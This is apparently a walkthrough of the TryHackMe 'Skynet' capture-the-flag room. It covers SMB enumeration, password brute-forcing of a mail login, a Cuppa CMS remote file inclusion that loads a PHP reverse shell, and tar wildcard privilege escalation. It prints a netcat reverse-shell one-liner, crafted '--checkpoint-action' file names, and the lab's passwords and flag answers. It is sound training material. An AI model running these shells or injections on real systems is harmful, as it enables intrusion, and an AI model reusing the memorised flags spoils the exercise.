# Skynet Walkthrough
### Link
- https://tryhackme.com/room/skynet
---
### Task 1  Deploy and compromise the vulnerable machine 
**Question**
###### What is Miles password for his emails?
# Namp
```
    sudo nmap -sC -sV 10.10.6.134
```

*Port open*: 22/80/110/139/143/445

# Gobuster
```
    sudo gobuster dir -u http://[IP] -w [path]/wordlists/dirbuster/directory-list-2.3-medium.txt
```

I tryed all directories. Only http://10.10.6.134/squirrelmail/ redirects to login page

# check the samba server
```
    sudo enum4linux -S [IP]
```
We found:
- A SMB share --> [IP]/anonymous
- A user --> SKYNET\milesdyson

# Connect tp anonymous smb share

```
sudo smbclient //[IP]/anonymous
No password
```

Download the file attention.txt

```
get attention.txt
```

Move to Logs folder and download all logs

```
get logsX.txt
```


When you check all logs. only **log1.txt** is interesting. It looks like a **password file**

# Access to squirrelmail

We know the user is : **milesdyson**

We can use Burp to try all potential password from the file **log1.txt**

**Answer**
###### Password: cyborg007haloterminator

**Question**
###### What is the hidden directory?

# Check email
- Password reset
- new samba password: **)s{A&2Z=F^n_E.B`**

# Access to samba
```
smbclient --user=milesdyson //[IP]/milesdyson
```

Navigate to notes folder

Download the file : **important.txt**
```
get important.txt
```

Opem this file. We found a new directory: **CMS /45kra24zxs28v3yd**

**Answer**
###### /45kra24zxs28v3yd

**Question**
###### What is the vulnerability called when you can include a remote file for malicious purposes?

# Check the hidden directory
```
[IP]/45kra24zxs28v3yd
```

Check the source code page. Sometimes you can find something interesting but today , nothing

# Check the content of this hiden directory
```
sudo gobuster dir -u http://[IP]/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Check the link: http://[IP]/45kra24zxs28v3yd/administrator/

We can see the **Cuppa cms framework** is used

# Cuppa cms vulnerability

Check the exploit db (exploit-db.com)

We can see this framework has a **Remote File Inclusion** vulnerability

**Answer**
###### Remote File Inclusion


**Question**
###### What is the user flag?

# Exploit this vulnerability
- First
	- Download and edit php-reverse-shell.php (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
	- Define your IP and Port

- Second
	- Open local server web from the directory where the reverse shell is located

```
sudo python3 -m http.server 
```

- Third
	- Start listener by using the port specified in the reverse shell
```
nc -nlvp [port]
```

- Fourth
	- From the exploit-db , you can see in the description how to proceed

```
[URL]/alerts/alertConfigField.php?urlConfig=[path to reverse shell]
```

- Fifth
    - You gain the access
	- Navigate to milesdyson home --> cd /home/milesdyson
	- find user.txt flag

**Answer**
###### 7ce5c2109a40f958099283600a9ae807

# Privilege escalation

We cannot access root information with milesdyson account.

- First
	- Check the milesdyson home
	- Open backup.sh
	- We can see this script performs 2 actions
		- First : move to /var/www/html
		- Second: uses tar
	- check the website : https://gtfobins.github.io/gtfobins/tar/
	
    - Second
		- Perform same actions as the backup.sh
		- Move to var/www/html
		- Launch a listener
        ```
		nc -nlvp [PORT]
        ```

		- Create 3 files
			- shell.sh based on the first method of exploiting wildcart for privilege escalation (https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

            ```
		    echo "mkfifo /tmp/lhennp; nc [Your IP] [Port] 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
			echo "" > "--checkpoint-action=exec=sh shell.sh"
		    echo "" > "--checkpoint=1"
            ```

		- Wait few seconds and you'll obtain the shell
        ```
		cat /root/root.txt
        ```
**Answer**
###### 3f0372db24753accc7179a282cd6a949
